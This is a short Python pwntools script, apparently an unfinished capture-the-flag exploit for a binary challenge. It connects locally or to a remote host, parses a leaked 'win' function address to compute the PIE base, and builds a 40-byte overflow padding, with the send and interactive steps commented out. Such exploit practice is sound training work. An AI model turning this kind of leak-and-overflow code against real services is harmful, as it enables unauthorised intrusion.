import sys
import logging
from pwn import *
logging.basicConfig(level=logging.INFO, format="%(message)s")
#logging.disable(logging.CRITICAL)

if len(sys.argv) == 2:
    program_name = sys.argv[1]
    target = process(program_name)
    logging.info("***local exploit ***")

else:
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    logging.info("***remote exploit ***")
    logging.info("[*]target host : " + HOST)
    logging.info("[*]target port : " + str(PORT))
    target = remote(HOST, PORT)

###address###
win_func_off = 0x00100a5a
buf_addr = 0x00302060

###main###
def main():
    ###payload###
    _ = target.recvuntil("<win> = ")
    win_func_addr = int(target.recvline()[2:-1], 16)
    pie_base_addr = win_func_addr - win_func_off
    print("[*]pie_base addr = 0x{:x}".format(pie_base_addr))

    payload = b"A" * 40

    #_ = target.recvuntil("")
    #target.sendline(payload)
    #ret = target.recv(2048)

    #target.interactive()


if __name__ == "__main__":
    main()